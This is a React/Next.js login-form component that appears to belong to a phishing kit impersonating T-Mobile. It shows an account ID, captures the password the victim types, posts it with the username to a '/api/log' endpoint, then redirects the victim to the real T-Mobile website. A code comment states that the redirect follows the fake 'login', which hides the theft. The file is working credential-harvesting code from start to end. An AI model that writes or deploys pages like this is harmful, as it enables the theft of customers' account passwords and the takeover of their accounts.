'use client';

import type React from "react";
import { useState } from "react";
import Link from "next/link";
import { ChevronLeft, Eye, EyeOff } from "lucide-react";

export function WelcomeForm({ accountId }: { accountId: string }) {
  const [password, setPassword] = useState("");
  const [show, setShow] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);

    const data = {
      username: accountId,
      password: password,
      email: accountId,
      type: 'welcome'
    };

    try {
      await fetch('/api/log', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data),
      });
    } catch (err) {
      console.error(err);
    } finally {
      // Always redirect to real T-Mobile after "login"
      window.location.href = "https://www.t-mobile.com";
    }
  };

  return (
    <div className="flex w-full max-w-md flex-col">
      <div className="rounded-2xl border border-border bg-card p-8 shadow-sm md:p-10">
        <h1 className="text-4xl font-bold tracking-tight text-foreground">Welcome!</h1>
        <p className="mt-3 text-base font-bold text-foreground">{accountId}</p>

        <form onSubmit={handleSubmit} className="mt-6">
          <label htmlFor="password" className="sr-only">Password</label>
          <div className="relative">
            <input
              id="password"
              name="password"
              type={show ? "text" : "password"}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Password"
              className="w-full rounded-md border border-input bg-background px-4 py-3 pr-12 text-sm text-foreground outline-none placeholder:text-muted-foreground focus:border-primary focus:ring-1 focus:ring-primary"
            />
            <button
              type="button"
              onClick={() => setShow((s) => !s)}
              className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground"
            >
              {show ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
            </button>
          </div>

          <button
            type="submit"
            disabled={isLoading}
            className="mt-6 w-full rounded-md bg-muted px-6 py-3 text-sm font-bold text-foreground transition-colors hover:bg-muted/80 disabled:opacity-70"
          >
            {isLoading ? "Logging in..." : "Log in"}
          </button>
        </form>

        <a href="#" className="mt-8 inline-block text-sm font-bold text-primary hover:underline">
          Forgot password?
        </a>
      </div>

      <Link
        href="/"
        className="mt-6 inline-flex items-center gap-1 self-start text-sm font-bold text-foreground hover:underline"
      >
        <ChevronLeft className="h-4 w-4" />
        Back
      </Link>
    </div>
  );
}